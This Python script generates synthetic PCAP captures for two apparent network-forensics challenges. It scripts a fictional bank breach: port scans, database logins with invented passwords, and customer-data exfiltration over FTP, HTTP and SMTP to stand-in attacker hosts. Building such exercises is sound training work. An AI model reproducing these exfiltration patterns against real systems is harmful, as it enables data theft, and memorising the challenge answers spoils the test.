#!/usr/bin/env python3
from __future__ import annotations

import argparse
import random
import socket
import struct
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path

LINKTYPE_RAW_IPV4 = 228
WINDOW_SIZE = 64240


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"

    total = 0
    for index in range(0, len(data), 2):
        total += (data[index] << 8) + data[index + 1]
        total = (total & 0xFFFF) + (total >> 16)

    return (~total) & 0xFFFF


def ip_to_bytes(address: str) -> bytes:
    return socket.inet_aton(address)


def tcp_flags(flags: str) -> int:
    mapping = {
        "F": 0x01,
        "S": 0x02,
        "R": 0x04,
        "P": 0x08,
        "A": 0x10,
        "U": 0x20,
    }
    value = 0
    for flag in flags:
        value |= mapping[flag]
    return value


def build_ipv4(src: str, dst: str, proto: int, payload: bytes, ident: int, ttl: int = 64) -> bytes:
    version_ihl = 0x45
    total_length = 20 + len(payload)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        0,
        total_length,
        ident & 0xFFFF,
        0,
        ttl,
        proto,
        0,
        ip_to_bytes(src),
        ip_to_bytes(dst),
    )
    header_checksum = checksum(header)
    return struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        0,
        total_length,
        ident & 0xFFFF,
        0,
        ttl,
        proto,
        header_checksum,
        ip_to_bytes(src),
        ip_to_bytes(dst),
    ) + payload


def build_tcp(
    src: str,
    dst: str,
    sport: int,
    dport: int,
    seq: int,
    ack: int,
    flags: str,
    payload: bytes,
    ident: int,
    ttl: int = 64,
) -> bytes:
    offset_reserved_flags = (5 << 12) | tcp_flags(flags)
    tcp_header = struct.pack(
        "!HHIIHHHH",
        sport,
        dport,
        seq & 0xFFFFFFFF,
        ack & 0xFFFFFFFF,
        offset_reserved_flags,
        WINDOW_SIZE,
        0,
        0,
    )
    pseudo_header = struct.pack(
        "!4s4sBBH",
        ip_to_bytes(src),
        ip_to_bytes(dst),
        0,
        6,
        len(tcp_header) + len(payload),
    )
    tcp_checksum = checksum(pseudo_header + tcp_header + payload)
    tcp_header = struct.pack(
        "!HHIIHHHH",
        sport,
        dport,
        seq & 0xFFFFFFFF,
        ack & 0xFFFFFFFF,
        offset_reserved_flags,
        WINDOW_SIZE,
        tcp_checksum,
        0,
    )
    return build_ipv4(src, dst, 6, tcp_header + payload, ident, ttl=ttl)


def build_udp(
    src: str,
    dst: str,
    sport: int,
    dport: int,
    payload: bytes,
    ident: int,
    ttl: int = 64,
) -> bytes:
    udp_length = 8 + len(payload)
    udp_header = struct.pack("!HHHH", sport, dport, udp_length, 0)
    pseudo_header = struct.pack(
        "!4s4sBBH",
        ip_to_bytes(src),
        ip_to_bytes(dst),
        0,
        17,
        udp_length,
    )
    udp_checksum = checksum(pseudo_header + udp_header + payload)
    udp_header = struct.pack("!HHHH", sport, dport, udp_length, udp_checksum)
    return build_ipv4(src, dst, 17, udp_header + payload, ident, ttl=ttl)


def encode_dns_name(name: str) -> bytes:
    encoded = bytearray()
    for label in name.rstrip(".").split("."):
        encoded.append(len(label))
        encoded.extend(label.encode("ascii"))
    encoded.append(0)
    return bytes(encoded)


def build_dns_query(transaction_id: int, qname: str) -> bytes:
    header = struct.pack("!HHHHHH", transaction_id, 0x0100, 1, 0, 0, 0)
    question = encode_dns_name(qname) + struct.pack("!HH", 1, 1)
    return header + question


def build_dns_response(transaction_id: int, qname: str, answer_ip: str) -> bytes:
    question = encode_dns_name(qname) + struct.pack("!HH", 1, 1)
    answer = struct.pack("!HHHLH", 0xC00C, 1, 1, 300, 4) + ip_to_bytes(answer_ip)
    header = struct.pack("!HHHHHH", transaction_id, 0x8180, 1, 1, 0, 0)
    return header + question + answer


@dataclass
class PacketRecord:
    timestamp: float
    payload: bytes


class PacketBuilder:
    def __init__(self, start_time: float, seed: int) -> None:
        self.current_time = start_time
        self.rng = random.Random(seed)
        self.ident = 1
        self.records: list[PacketRecord] = []

    def add_raw(self, payload: bytes, step: float = 0.001) -> None:
        self.records.append(PacketRecord(self.current_time, payload))
        self.current_time += step

    def add_tcp(
        self,
        src: str,
        dst: str,
        sport: int,
        dport: int,
        seq: int,
        ack: int,
        flags: str,
        payload: bytes = b"",
        step: float = 0.001,
        ttl: int = 64,
    ) -> None:
        packet = build_tcp(src, dst, sport, dport, seq, ack, flags, payload, self.ident, ttl=ttl)
        self.ident += 1
        self.add_raw(packet, step=step)

    def add_udp(
        self,
        src: str,
        dst: str,
        sport: int,
        dport: int,
        payload: bytes,
        step: float = 0.001,
        ttl: int = 64,
    ) -> None:
        packet = build_udp(src, dst, sport, dport, payload, self.ident, ttl=ttl)
        self.ident += 1
        self.add_raw(packet, step=step)


def seq_advance(payload: bytes, flags: str) -> int:
    advance = len(payload)
    if "S" in flags or "F" in flags:
        advance += 1
    return advance


def add_tcp_conversation(
    builder: PacketBuilder,
    src: str,
    dst: str,
    sport: int,
    dport: int,
    client_messages: list[bytes],
    server_messages: list[bytes],
    client_prefix: bytes | None = None,
    server_prefix: bytes | None = None,
) -> None:
    client_seq = builder.rng.randint(10_000, 900_000)
    server_seq = builder.rng.randint(20_000, 900_000)

    builder.add_tcp(src, dst, sport, dport, client_seq, 0, "S", step=0.0008)
    client_seq += 1
    builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "SA", step=0.0008)
    server_seq += 1
    builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "A", step=0.0008)

    if server_prefix:
        builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "PA", server_prefix, step=0.0012)
        server_seq += len(server_prefix)
        builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "A", step=0.0007)

    if client_prefix:
        builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "PA", client_prefix, step=0.0012)
        client_seq += len(client_prefix)
        builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "A", step=0.0007)

    for client_payload, server_payload in zip(client_messages, server_messages):
        if client_payload:
            builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "PA", client_payload, step=0.0015)
            client_seq += len(client_payload)
            builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "A", step=0.0006)
        if server_payload:
            builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "PA", server_payload, step=0.0015)
            server_seq += len(server_payload)
            builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "A", step=0.0006)

    if len(client_messages) > len(server_messages):
        for client_payload in client_messages[len(server_messages):]:
            builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "PA", client_payload, step=0.0015)
            client_seq += len(client_payload)
            builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "A", step=0.0006)
    elif len(server_messages) > len(client_messages):
        for server_payload in server_messages[len(client_messages):]:
            builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "PA", server_payload, step=0.0015)
            server_seq += len(server_payload)
            builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "A", step=0.0006)

    builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "FA", step=0.0008)
    client_seq += 1
    builder.add_tcp(dst, src, dport, sport, server_seq, client_seq, "FA", step=0.0008)
    server_seq += 1
    builder.add_tcp(src, dst, sport, dport, client_seq, server_seq, "A", step=0.0011)


def write_pcap(path: Path, packets: list[PacketRecord]) -> None:
    with path.open("wb") as handle:
        handle.write(struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, LINKTYPE_RAW_IPV4))
        for record in packets:
            seconds = int(record.timestamp)
            micros = int(round((record.timestamp - seconds) * 1_000_000))
            payload = record.payload
            handle.write(struct.pack("<IIII", seconds, micros, len(payload), len(payload)))
            handle.write(payload)


def dns_roundtrip(builder: PacketBuilder, client: str, resolver: str, qname: str, answer_ip: str, sport: int) -> None:
    txid = builder.rng.randint(0, 0xFFFF)
    builder.add_udp(client, resolver, sport, 53, build_dns_query(txid, qname), step=0.001)
    builder.add_udp(resolver, client, 53, sport, build_dns_response(txid, qname, answer_ip), step=0.0014)


def generate_200(builder: PacketBuilder) -> None:
    attacker = "203.0.113.55"
    resolver = "192.168.1.1"

    for qname, answer in [
        ("db-core.firstbank.local", "192.168.1.110"),
        ("db-replica1.firstbank.local", "192.168.1.111"),
        ("pg-archive.firstbank.local", "192.168.1.112"),
        ("backup-api.firstbank.local", "192.168.1.50"),
    ]:
        dns_roundtrip(builder, attacker, resolver, qname, answer, sport=53000 + builder.rng.randint(0, 3000))

    ssh_targets = [("192.168.1.50", 22), ("192.168.1.110", 22), ("192.168.1.111", 22), ("192.168.1.112", 22)]
    for index, (target, port) in enumerate(ssh_targets, start=1):
        sport = 41000 + index
        seq = builder.rng.randint(10_000, 999_999)
        ack = builder.rng.randint(10_000, 999_999)
        builder.add_tcp(attacker, target, sport, port, seq, 0, "S", step=0.0009)
        builder.add_tcp(target, attacker, port, sport, ack, seq + 1, "SA", step=0.0009)
        builder.add_tcp(attacker, target, sport, port, seq + 1, ack + 1, "A", step=0.0007)
        builder.add_tcp(target, attacker, port, sport, ack + 1, seq + 1, "PA", b"SSH-2.0-OpenSSH_8.4\r\n", step=0.0012)
        builder.add_tcp(attacker, target, sport, port, seq + 1, ack + 22, "R", step=0.0011)

    decoy_db_flows = [
        ("192.168.1.110", 3306, b"username=finance_dba&password=Winter2026!&db=ledger", b"ERR invalid credentials"),
        ("192.168.1.111", 3306, b"username=replica_sync&password=MirrorKey88#&db=replica", b"ERR access denied"),
        ("192.168.1.112", 5432, b"user=audit_readonly password=AuditTrail!2026", b"FATAL: password authentication failed"),
        ("192.168.1.113", 3306, b"username=root&password=RootAccess!1&db=mysql", b"ERR denied for host"),
        ("192.168.1.114", 5432, b"user=backupsvc password=VaultDump2026$", b"FATAL: role does not exist"),
        ("192.168.1.115", 3306, b"username=finance_export&password=CsvWriter77!&db=warehouse", b"ERR invalid token"),
    ]

    for index, (server, port, client_payload, server_payload) in enumerate(decoy_db_flows):
        add_tcp_conversation(
            builder,
            attacker,
            server,
            47000 + index,
            port,
            client_messages=[client_payload, b"SELECT VERSION();\r\n"],
            server_messages=[server_payload, b""],
            server_prefix=b"DB-SERVICE READY\r\n",
        )

    real_client_messages = [
        (
            b"username=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918"
            b"&password=15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225"
            b"&database=firstbank_finance\r\n"
        ),
        b"SET application_name='psql-export';\r\n",
        b"SELECT customer_id, balance FROM customers LIMIT 3;\r\n",
    ]
    real_server_messages = [
        b"AUTH OK role=database_admin method=sha256-field-match\r\n",
        b"SET\r\n",
        b"customer_id,balance\n10014,4200.50\n10015,811.02\n10016,0.00\n",
    ]
    add_tcp_conversation(
        builder,
        attacker,
        "192.168.1.110",
        48555,
        5432,
        client_messages=real_client_messages,
        server_messages=real_server_messages,
        server_prefix=b"PostgreSQL 14.2 ready for startup packet\r\n",
    )

    add_tcp_conversation(
        builder,
        attacker,
        "192.168.1.50",
        49880,
        80,
        client_messages=[
            (
                b"POST /api/backup/export HTTP/1.1\r\n"
                b"Host: backup-api.firstbank.local\r\n"
                b"Content-Type: application/json\r\n"
                b"Content-Length: 74\r\n\r\n"
                b'{"database":"customers","format":"csv","token":"decoy-backup-key-2026"}'
            )
        ],
        server_messages=[b"HTTP/1.1 403 Forbidden\r\nContent-Length: 22\r\n\r\nbackup token rejected"],
    )

    for qname, answer in [
        ("mysql-admin.firstbank.local", "192.168.1.113"),
        ("db-vault.firstbank.local", "192.168.1.114"),
        ("exports.firstbank.local", "192.168.1.115"),
    ]:
        dns_roundtrip(builder, attacker, resolver, qname, answer, sport=56000 + builder.rng.randint(0, 2000))


def add_syn_scan(builder: PacketBuilder, src: str, dst: str, ports: list[int], sport_base: int) -> None:
    for index, port in enumerate(ports):
        sport = sport_base + index
        seq = builder.rng.randint(50_000, 999_999)
        ack = builder.rng.randint(50_000, 999_999)
        builder.add_tcp(src, dst, sport, port, seq, 0, "S", step=0.0007)
        builder.add_tcp(dst, src, port, sport, ack, seq + 1, "SA", step=0.0007)
        builder.add_tcp(src, dst, sport, port, seq + 1, ack + 1, "R", step=0.0009)


def generate_300(builder: PacketBuilder) -> None:
    attacker = "203.0.113.55"
    resolver = "192.168.1.1"

    add_syn_scan(builder, attacker, "192.168.1.20", [21, 22, 23, 80, 443, 445], 43000)
    add_syn_scan(builder, attacker, "192.168.1.50", [80, 443, 3306, 5432], 43100)
    add_syn_scan(builder, attacker, "192.168.1.60", [25, 110, 143], 43200)

    for qname, answer in [
        ("ftp-drop1.outbound-sync.net", "198.51.100.50"),
        ("upload-archive.shadow-mail.net", "192.0.2.100"),
        ("billing-export.stage-sync.net", "198.51.100.75"),
        ("smtp-relay.badmx.net", attacker),
        ("command.hidden-node.net", "198.51.100.200"),
    ]:
        dns_roundtrip(builder, "192.168.1.60", resolver, qname, answer, sport=52000 + builder.rng.randint(0, 3000))

    ftp_decoys = [
        ("192.168.1.60", "198.51.100.50", b"STOR customers_25000.csv\r\n", b"226 transferred 25000 records\r\n"),
        ("192.168.1.61", "192.0.2.100", b"STOR archive_73000.csv\r\n", b"226 transferred 73000 records\r\n"),
        ("192.168.1.62", "198.51.100.75", b"STOR vip_18000.csv\r\n", b"226 transferred 18000 records\r\n"),
    ]
    for index, (src, dst, stor_cmd, final_response) in enumerate(ftp_decoys):
        add_tcp_conversation(
            builder,
            src,
            dst,
            45000 + index,
            21,
            client_messages=[
                b"USER finance-archive\r\n",
                b"PASS Archive!2026\r\n",
                stor_cmd,
            ],
            server_messages=[
                b"331 password required\r\n",
                b"230 login ok\r\n",
                final_response,
            ],
            server_prefix=b"220 transfer-node FTP ready\r\n",
        )

    http_decoys = [
        ("192.168.1.60", "198.51.100.50", 25000),
        ("192.168.1.60", "192.0.2.100", 73000),
        ("192.168.1.61", "198.51.100.75", 18000),
        ("192.168.1.62", "203.0.113.200", 9200),
    ]
    for index, (src, dst, count) in enumerate(http_decoys):
        body = (
            f'{{"job":"customer_export","record_count":{count},"status":"complete","channel":"http"}}'
        ).encode("ascii")
        request = (
            f"POST /api/upload HTTP/1.1\r\n"
            f"Host: {dst}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
        ).encode("ascii") + body
        response = b"HTTP/1.1 200 OK\r\nContent-Length: 17\r\n\r\nupload completed"
        add_tcp_conversation(
            builder,
            src,
            dst,
            46000 + index,
            80,
            client_messages=[request],
            server_messages=[response],
        )

    add_tcp_conversation(
        builder,
        "203.0.113.55",
        "192.168.1.50",
        47000,
        80,
        client_messages=[
            (
                b"POST /api/auth/validate HTTP/1.1\r\n"
                b"Host: 192.168.1.50\r\n"
                b"Cookie: session_token=eyJ1c2VyIjoiY2ZvIiwiYWRtaW4iOnRydWV9\r\n"
                b"Content-Length: 0\r\n\r\n"
            )
        ],
        server_messages=[b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"],
    )

    builder.current_time += 0.018

    smtp_client = "192.168.1.60"
    smtp_server = attacker
    smtp_body = (
        b"From: backup@firstbank.com\r\n"
        b"To: attacker@malicious.com\r\n"
        b"Subject: full export status\r\n"
        b"\r\n"
        b"Primary exfil endpoint: 203.0.113.55\r\n"
        b"Customer records exposed: 50000\r\n"
        b"Archive: firstbank_customers_full_50000.sql.gz\r\n"
        b"Previous FTP/HTTP pushes were staging noise only.\r\n"
        b".\r\n"
    )
    add_tcp_conversation(
        builder,
        smtp_client,
        smtp_server,
        47525,
        25,
        client_messages=[
            b"EHLO relay.firstbank.local\r\n",
            b"MAIL FROM:<backup@firstbank.com>\r\n",
            b"RCPT TO:<attacker@malicious.com>\r\n",
            b"DATA\r\n",
            smtp_body,
            b"QUIT\r\n",
        ],
        server_messages=[
            b"250-relay.badmx.net Hello\r\n250 SIZE 52428800\r\n",
            b"250 sender ok\r\n",
            b"250 recipient ok\r\n",
            b"354 end with <CRLF>.<CRLF>\r\n",
            b"250 queued as 9F2A1\r\n",
            b"221 closing connection\r\n",
        ],
        server_prefix=b"220 relay.badmx.net ESMTP ready\r\n",
    )

    add_tcp_conversation(
        builder,
        "192.168.1.70",
        "198.51.100.220",
        48010,
        23,
        client_messages=[b"admin\r\n", b"legacyPass!\r\n", b"show accounts\r\n"],
        server_messages=[b"login: ", b"Password: ", b"permission denied\r\n"],
    )

    add_tcp_conversation(
        builder,
        attacker,
        "192.168.1.75",
        48100,
        445,
        client_messages=[b"\x05\x00\x0b\x03\x10\x00\x00\x48", b"\x05\x00\x00\x13session-enum"],
        server_messages=[b"\x05\x00\x02\x03access-denied", b"\x05\x00\x02\x03rpc-close"],
    )

    for qname, answer in [
        ("malicious.com", attacker),
        ("mirror-drop.badcdn.net", "198.51.100.75"),
        ("backup-stage.deadroute.net", "203.0.113.200"),
    ]:
        dns_roundtrip(builder, "192.168.1.60", resolver, qname, answer, sport=59000 + builder.rng.randint(0, 2000))

    add_tcp_conversation(
        builder,
        "192.168.1.60",
        "198.51.100.50",
        48900,
        80,
        client_messages=[
            (
                b"POST /upload HTTP/1.1\r\n"
                b"Host: 198.51.100.50\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Length: 68\r\n\r\n"
                b"[CUSTOMER EXPORT]\nrecord_count=12000\nclassification=staging-copy\n"
            )
        ],
        server_messages=[b"HTTP/1.1 200 OK\r\nContent-Length: 7\r\n\r\nstaged\n"],
    )


def build_packets(challenge: str) -> list[PacketRecord]:
    start = datetime(2026, 4, 1, 3 if challenge == "200" else 4, 0, 0, tzinfo=timezone.utc).timestamp()
    builder = PacketBuilder(start_time=start, seed=200 if challenge == "200" else 300)
    if challenge == "200":
        generate_200(builder)
    else:
        generate_300(builder)
    return builder.records


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate targeted network-forensics PCAPs.")
    parser.add_argument("--challenge", choices=["200", "300"], required=True)
    parser.add_argument("--output", required=True)
    args = parser.parse_args()

    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    packets = build_packets(args.challenge)
    write_pcap(output, packets)
    print(f"generated {len(packets)} packets -> {output}")


if __name__ == "__main__":
    main()
